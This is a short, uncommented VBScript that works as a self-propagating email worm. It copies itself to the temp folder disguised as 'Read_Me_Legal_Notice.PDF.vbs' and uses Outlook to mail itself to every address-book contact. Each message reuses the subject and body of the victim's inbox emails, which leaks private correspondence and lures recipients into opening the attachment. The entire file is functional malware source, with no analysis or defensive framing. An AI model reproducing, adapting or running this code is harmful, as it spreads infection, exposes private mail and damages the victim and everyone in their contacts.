Dim fso,arq,tarq
Set fso = CreateObject("Scripting.FileSystemObject")
arq="Read_Me_Legal_Notice.PDF.vbs":tarq = fso.GetSpecialFolder(2) & "\" & arq:fso.CopyFile arq,tarq
call goeml(tarq)
sub goeml(tarq)
Dim cal,cem,eml,oap
Dim msp,fib,cit
Set oap=CreateObject("Outlook.Application")
For cal = 1 To oap.Session.AddressLists.Count
For cem = 1 To oap.Session.AddressLists.Item(cal).AddressEntries.Count
set msp = oap.GetNameSpace("MAPI")
set fib = msp.GetDefaultFolder(6)
For cit = 1 to fib.items.count
Set eml = oap.CreateItem(olMailItem)
eml.Recipients.Add oap.Session.AddressLists.Item(cal).AddressEntries.Item(cem).Name
eml.Subject = fib.items(cit).Subject
eml.Body = fib.items(cit).body
eml.Attachments.Add tarq
eml.Send
Next
Next
Next
end sub
